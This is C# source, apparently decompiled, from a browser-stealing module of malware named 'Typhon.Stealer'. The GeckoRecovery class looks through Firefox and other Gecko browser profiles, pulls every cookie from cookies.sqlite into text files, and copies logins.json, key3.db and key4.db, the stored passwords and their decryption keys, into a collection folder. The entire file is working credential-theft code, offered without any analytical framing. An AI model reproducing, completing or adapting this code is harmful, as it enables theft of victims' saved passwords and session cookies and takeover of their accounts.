using System;
using System.Collections.Generic;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Browsers.Gecko
{
	// Token: 0x02000027 RID: 39
	internal class GeckoRecovery
	{
		// Token: 0x060000A4 RID: 164 RVA: 0x000072A8 File Offset: 0x000054A8
		public static void SaveData(string saveDir)
		{
			if (!Directory.Exists(saveDir))
			{
				Directory.CreateDirectory(saveDir);
			}
			foreach (string text in Paths.GeckoPaths)
			{
				try
				{
					string name = new DirectoryInfo(text).Name;
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + "\\Profiles"))
					{
						if (!Directory.Exists(saveDir))
						{
							Directory.CreateDirectory(saveDir);
						}
						List<DataModels.Cookie> cookies = GeckoRecovery.GetCookies(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text);
						if (!Directory.Exists(saveDir + "\\Cookies"))
						{
							Directory.CreateDirectory(saveDir + "\\Cookies");
						}
						DataFormatter.WriteCookies(cookies, saveDir + "\\Cookies\\Cookies_(" + name + ").txt");
						if (!Directory.Exists(saveDir + "\\GeckoLogins\\" + name))
						{
							Directory.CreateDirectory(saveDir + "\\GeckoLogins\\" + name);
						}
						GeckoRecovery.GetDatabaseLogins(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + "\\Profiles\\", saveDir + "\\GeckoLogins\\" + name);
						if (Directory.GetFiles(saveDir + "\\Cookies").Length == 0)
						{
							IOHelper.DeleteDirectory(saveDir + "\\Cookies", false);
						}
						if (Directory.GetFiles(saveDir + "\\GeckoLogins\\" + name).Length == 0)
						{
							IOHelper.DeleteDirectory(saveDir + "\\GeckoLogins", false);
						}
						if (Directory.GetFiles(saveDir + "\\GeckoLogins").Length == 0 || Directory.GetDirectories(saveDir + "\\GeckoLogins").Length == 0)
						{
							IOHelper.DeleteDirectory("", false);
						}
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x0000744C File Offset: 0x0000564C
		private static string GetCookiesFromDB(string path)
		{
			try
			{
				string path2 = path + "\\Profiles";
				if (Directory.Exists(path2))
				{
					foreach (string str in Directory.GetDirectories(path2))
					{
						if (File.Exists(str + "\\cookies.sqlite"))
						{
							return str + "\\cookies.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x000074C0 File Offset: 0x000056C0
		public static List<DataModels.Cookie> GetCookies(string path)
		{
			List<DataModels.Cookie> list = new List<DataModels.Cookie>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(GeckoRecovery.GetCookiesFromDB(path), "moz_cookies");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					DataModels.Cookie item = default(DataModels.Cookie);
					item.sHostKey = sqlite.GetValue(i, 4);
					item.sName = sqlite.GetValue(i, 2);
					item.sValue = sqlite.GetValue(i, 3);
					item.sPath = sqlite.GetValue(i, 5);
					item.sExpiresUtc = sqlite.GetValue(i, 6);
					Counter.Cookies++;
					list.Add(item);
				}
				return list;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return new List<DataModels.Cookie>();
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00007588 File Offset: 0x00005788
		private static void CopyDatabaseFile(string from, string sSavePath)
		{
			try
			{
				if (File.Exists(from))
				{
					File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x000075CC File Offset: 0x000057CC
		public static void GetDatabaseLogins(string path, string sSavePath)
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
			if (files == null)
			{
				return;
			}
			foreach (string path2 in files)
			{
				foreach (string path3 in GeckoRecovery.keyFiles)
				{
					GeckoRecovery.CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(path2), path3), sSavePath);
				}
			}
		}

		// Token: 0x04000046 RID: 70
		private static string[] keyFiles = new string[]
		{
			"key3.db",
			"key4.db",
			"logins.json"
		};
	}
}
